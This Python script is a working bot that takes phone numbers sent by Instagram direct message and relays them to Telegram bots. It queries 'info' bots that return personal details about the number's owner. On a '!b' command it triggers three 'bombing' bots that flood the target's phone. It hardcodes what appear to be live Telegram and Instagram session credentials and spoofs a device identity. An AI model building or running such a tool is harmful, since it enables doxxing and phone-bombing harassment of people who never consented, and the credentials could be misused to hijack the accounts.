import os
import asyncio
import random
from pyrogram import Client
from instagrapi import Client as InstaClient
from instagrapi.exceptions import ClientError, PleaseWaitFewMinutes

# === CONFIGURATION ===
# Best practice: Use environment variables, with hardcodes as fallback.
API_ID = os.getenv("API_ID", 31908861)
API_HASH = os.getenv("API_HASH", "db7b4118965e302e60cf66cc89570166")

# === 🔥 HARDCODED SESSIONS (LATEST UPDATE) 🔥 ===
TG_SESSION_HARDCODE = os.getenv("TG_SESSION_STRING", "BQHm4_0Ae0v9hu6NEuivgwAZMUYbaoawmR0NMy8pieT5kJrrv1aNN6uS603F4Fbp8IhWMUS7KkQzUE9xNHZRh_V9mBV2hqVOLdZ6yH3mvxMhlKNFXz7pypiop0hvIl9WAVb314FOm42TEmOONArXm8678PRPHTT5rErg8Br1mlKhv9E9DnMEnvnvUbtUx7JEnPF3NRAJ49aDip_LQ_2eCfU_Maba617c1pC2x_tgCRwhPjV-uKE_pdrV4ieF5rpFx95oA2LHA_pIuVke8gZ7wFACFN_gW3PXyWnCP9uXJ8EtyOgApr1PFQJUZyeAR4N-1rbvxtKHystUQneIapWGmQH6RoadjwAAAAHylqcSAA")
# Check environment variable INSTA_SESSION_ID first
IG_SESSION_ID_HARDCODE = os.getenv("INSTA_SESSION_ID", "75136570684%3Af6PP2JHwpjctRF%3A22%3AAYhcx-naKgkUhqsz2R6v89yWhTFOZvaDtGbdCunwMw") 
# =======================================================

# 👇 BOT GROUPS
BOT_INFO_LIST = ["@CYBERINFOXXXBOT", "@TrueCalleRobot"]
BOT_ACTION_LIST = ["@crazy_tools_bot", "@Lucixarp_bot", "@DadeisBack_bot"]

# FIX: This function applies a patch required by newer instagrapi
# versions due to changes in Instagram's API response structure,
# which often causes the "'data'" error.
def patch_instagrapi():
    try:
        from instagrapi.types import User
        # Important fix: Allows extra fields in the JSON response
        # that the library's User model might not be expecting.
        User.model_config['extra'] = 'ignore' 
        print("   [System] instagrapi User model patched successfully.")
    except Exception as e:
        print(f"   [System] Warning: Could not patch instagrapi User model. Error: {e}")
        pass
        
patch_instagrapi() # Call the patch function at startup

print("💀 Starting FINAL MASTER BOT (Syntax Fixed)...")

# === CLIENT INITIALIZATION ===
app = Client(
    "replit_master_bot", 
    api_id=API_ID, 
    api_hash=API_HASH, 
    session_string=TG_SESSION_HARDCODE, 
    in_memory=True
)

ig = InstaClient()
# Device Masking
ig.set_device({
    "app_version": "269.0.0.18.75",
    "android_version": 29,
    "android_release": "10.0",
    "dpi": "480dpi",
    "resolution": "1080x2340",
    "manufacturer": "Samsung",
    "device": "SM-S918B",
    "model": "Galaxy S23 Ultra",
    "cpu": "exynos990",
    "version_code": "314665256"
})

PROCESSED_IDS = set()

# === HELPER 1: INFO BOT (SPAM FIX) ===
async def get_info_from_bot(app_client, target_bot, query):
    print(f"   ✈️ [{target_bot}] Sending Query: {query}")
    try:
        sent_msg = await app_client.send_message(target_bot, query)
        await asyncio.sleep(2)
        print(f"   ⏳ [{target_bot}] Waiting for reply...")
        
        try:
            target_user = await app_client.get_users(target_bot)
            target_id = target_user.id
        except Exception:
            target_id = None 

        for i in range(8): 
            await asyncio.sleep(1) 
            async for message in app_client.get_chat_history(target_bot, limit=1):
                # Ensure we only process messages from the target bot AND newer than our sent message
                is_from_target_bot = (target_id is not None and message.from_user and message.from_user.id == target_id)
                # is_not_self_message = (message.from_user and message.from_user.id != app_client.me.id) # This check is redundant if we check for target_id
                is_new_message = (message.id > sent_msg.id)
                
                # Check 1: Is it a new message?
                if is_new_message:
                    # Check 2: Is it from the target bot (if we could resolve the ID)?
                    # If target_id is None, we rely only on it being new and the last message.
                    if target_id is None or is_from_target_bot:
                        print(f"   ✅ [{target_bot}] Reply received.")
                        raw_text = message.text or "📷 File Received"
                        if target_bot == "@CYBERINFOXXXBOT":
                            marker = "📞Telephone:"
                            if marker in raw_text:
                                return raw_text[raw_text.find(marker):]
                        return raw_text
        return f"⚠️ {target_bot} Slow/No Reply."
    except Exception as e:
        print(f"   ❌ [{target_bot}] Error: {e}")
        return f"Error: {e}"

# === HELPER 2: ACTION BOT ===
async def trigger_action_bot(app_client, target_bot, phone_10_digit):
    print(f"   💣 Triggering Action on {target_bot}...")
    try:
        sent_start = await app_client.send_message(target_bot, "/start")
        print(f"      Sent /start. Waiting for menu...")
        await asyncio.sleep(3) 
        
        button_clicked = False
        async for message in app_client.get_chat_history(target_bot, limit=1):
            if message.id > sent_start.id and message.reply_markup:
                
                if hasattr(message.reply_markup, 'keyboard'):
                    for row in message.reply_markup.keyboard:
                        for btn in row:
                            if "Start Bombing" in btn or btn.startswith("💣B") or btn.startswith("💣 B"):
                                print(f"      🔘 Clicking Button: {btn}")
                                await app_client.send_message(target_bot, btn)
                                button_clicked = True
                                break
                        if button_clicked: break
                
                if not button_clicked and hasattr(message.reply_markup, 'inline_keyboard'):
                    from pyrogram.raw.functions.messages import GetBotCallbackAnswer
                    from pyrogram.raw.types import DataJSON
                    
                    for row in message.reply_markup.inline_keyboard:
                        for btn in row:
                            if "Start Bombing" in btn.text or btn.text.startswith("💣B") or btn.text.startswith("💣 B"):
                                print(f"      🔘 Clicking Inline: {btn.text}")
                                # Use the raw method to handle callback query more reliably
                                await app_client.invoke(
                                    GetBotCallbackAnswer(
                                        peer=await app_client.resolve_peer(message.chat.id),
                                        msg_id=message.id,
                                        data=DataJSON(data=btn.callback_data)
                                    )
                                )
                                button_clicked = True
                                break
                        if button_clicked: break
        
        if not button_clicked:
            print("      ❌ Action Button ('Start Bombing' or '💣B') nahi mila.")
            return False

        await asyncio.sleep(2)
        print(f"      🚀 Sending Target Number: {phone_10_digit}")
        await app_client.send_message(target_bot, phone_10_digit)
        await asyncio.sleep(3) 
        
        print("      ✅ Action Triggered and Number Sent.")
        return True

    except Exception as e:
        print(f"      ❌ Action Fail: {e}")
        return False

# === INSTAGRAM LOGIC ===
def check_instagram_logic():
    print("⏳ Waiting for messages on IG...")
    try:
        # Fetching a larger amount to ensure we don't miss new threads
        threads = ig.direct_threads(amount=5) 
        if not threads: return None
        
        # Iterate through threads to find the newest unread message
        target_msg = None
        for thread in threads:
            for msg in thread.messages:
                if msg.user_id == ig.user_id: continue # Ignore bot's own messages
                if msg.item_type != 'text': continue # Only process text messages
                if msg.id in PROCESSED_IDS: continue # Ignore already processed messages

                # Found the newest, unprocessed text message
                target_msg = msg
                break # Stop searching in this thread
            if target_msg: break # Stop searching in all threads
        
        if not target_msg: 
            print("   💤 No new unread messages found.")
            return None
        
        PROCESSED_IDS.add(target_msg.id)
        
        raw_text = target_msg.text.strip()
        clean_digits = "".join(filter(str.isdigit, raw_text))
        
        print(f"📩 Got message: '{raw_text}'")

        if len(clean_digits) >= 10:
            last_10 = clean_digits[-10:]
            final_full = "+91" + last_10
            print(f"   ✅ Detected Number: {final_full}")
            
            if raw_text.lower().startswith("!b"):
                return {
                    "mode": "ACTION",
                    "user_id": target_msg.user_id,
                    "phone": last_10 
                }
            else:
                return {
                    "mode": "INFO",
                    "user_id": target_msg.user_id,
                    "phone": final_full 
                }
        print("   ❌ Number format not found (Too short). Ignoring.")
        return None

    except (ClientError, PleaseWaitFewMinutes) as e:
        print(f"\n🚨 INSTAGRAM LIMIT: {e}")
        return "COOL_DOWN"
    except Exception as e:
        print(f"⚠️ Error in IG check: {e}")
        # Return None or raise an exception based on desired behavior
        return None 

# === MAIN BOT LOOP ===
async def main():
    if not IG_SESSION_ID_HARDCODE:
        print("❌ Instagram Session Hardcode Missing! Please set INSTA_SESSION_ID.")
        return

    # 1. Instagram Login
    print("🔵 Logging in Instagram...")
    try:
        # The patch_instagrapi() call above should fix the 'data' error here.
        ig.login_by_sessionid(IG_SESSION_ID_HARDCODE)
        print("✅ Instagram Login Success!")
    except Exception as e:
        print(f"❌ Instagram Fail: {e}")
        return

    # 2. Telegram Login
    print("🔵 Logging in Telegram...")
    try:
        await app.start()
        # Set self-user info after login is successful
        try:
            me = await app.get_me()
            app.me = me
        except Exception:
            pass # Ignore if get_me fails after start
        print("✅ Telegram Login Success!")
    except Exception as e:
        print(f"❌ Telegram Fail: {e}")
        return
    
    # Initialize PROCESSED_IDS on startup to avoid re-processing old messages
    try:
        threads = ig.direct_threads(amount=10) # Check more threads on startup
        if threads:
            for thread in threads:
                if thread.messages: 
                    # Add the IDs of the last 5 messages in each thread as 'old'
                    for msg in thread.messages[:5]:
                        PROCESSED_IDS.add(msg.id)
        print(f"   [System] Ignored {len(PROCESSED_IDS)} old messages on startup.")
    except Exception as e:
        print(f"   [System] Warning: Could not initialize PROCESSED_IDS. Error: {e}")
    
    print("✅ All Systems Online & Ready!")

    while True:
        try:
            data = await asyncio.to_thread(check_instagram_logic)
            
            if data == "COOL_DOWN":
                print("⚠️ Rate Limit. Sleeping 2 mins...")
                await asyncio.sleep(120)
                continue
            
            if data and isinstance(data, dict):
                
                if data['mode'] == "ACTION":
                    print("--- ⚙️ MODE: ACTION (!b) ---")
                    
                    # Ensure the user_id is passed as a list, as direct_send expects it
                    ig.direct_send("💀 Bombing started on 3 bots...", user_ids=[data['user_id']])
                    
                    # ACTION on all 3 bots
                    for bot_username in BOT_ACTION_LIST:
                        await trigger_action_bot(app, bot_username, data['phone'])
                        await asyncio.sleep(random.randint(2, 4)) # Added slight random delay
                    
                    print("<<< 📤 Sending on IG: Bombing initiated.")
                    print("--- ✅ ACTION CYCLE COMPLETE ---")

                elif data['mode'] == "INFO":
                    print("--- ⚙️ MODE: INFO (Normal Number) ---")
                    
                    info_parts = []
                    
                    # INFO from all 2 bots
                    for bot_username in BOT_INFO_LIST:
                        info_result = await get_info_from_bot(app, bot_username, data['phone'])
                        info_parts.append(f"🤖 **Info from {bot_username}:**\n{info_result}")
                        await asyncio.sleep(random.randint(2, 4)) # Added slight random delay
                    
                    final_reply = "\n\n➖➖➖➖➖➖➖\n\n".join(info_parts)
                    
                    try:
                        # Ensure the user_id is passed as a list
                        ig.direct_send(final_reply, user_ids=[data['user_id']])
                        print("<<< 📤 Sending on IG: Combined Info.")
                        print("--- ✅ INFO CYCLE COMPLETE ---")
                    except Exception as e:
                        print(f"⚠️ Failed to send IG reply: {e}")

            print(f"💤 Waiting 15s...", end="\r")
            await asyncio.sleep(15)

        except Exception as e:
            print(f"\n⚠️ Critical Error in main loop: {e}")
            await asyncio.sleep(15)
        except asyncio.CancelledError:
            print("Loop cancelled. Shutting down...")
            break
        finally:
            if app.is_connected:
                await app.stop()


if __name__ == "__main__":
    print("--- Starting Program ---")
    try:
        # Wrap the whole execution to ensure clean shutdown
        loop = asyncio.get_event_loop()
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n👋 Program interrupted by user.")
    except Exception as e:
        print(f"☠️ Program Crashed: {e}")

